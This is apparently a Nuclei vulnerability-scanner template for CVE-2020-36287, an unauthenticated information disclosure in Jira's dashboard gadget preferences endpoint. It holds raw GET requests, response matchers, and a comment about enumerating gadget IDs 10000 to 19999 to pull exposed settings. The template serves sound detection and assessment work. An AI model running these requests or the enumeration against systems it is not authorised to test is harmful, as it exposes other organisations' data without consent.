id: CVE-2020-36287

info:
  name: Jira Dashboard Gadgets / Information Disclosure
  author: Jafar_Abo_Nada
  severity: medium
  description: The dashboard gadgets preference resource of the Atlassian gadgets plugin used in Jira Server and Jira Data Center before version 8.13.5, and from version 8.14.0 before version 8.15.1 allows remote anonymous attackers to obtain gadget related settings via a missing permissions check.
  tags: cve,cve2020,jira,atlassian,disclosure
  reference: |
      - https://twitter.com/Jafar_Abo_Nada/status/1386058611084890116
      - https://nvd.nist.gov/vuln/detail/CVE-2020-36287

  # On a vulnerable instance, iterate through gadget ID from 10000 to 19999 to get exposed information /rest/dashboards/1.0/10000/gadget/{{id}}/prefs

requests:
  - raw:
      - |
        GET /rest/dashboards/1.0/10000/gadget/10000/prefs HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

      - |
        GET /rest/dashboards/1.0/10000/gadget/10001/prefs HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "contains(body_1, '<userPrefsRepresentation>')"
          - "status_code_2 != 401"
        condition: and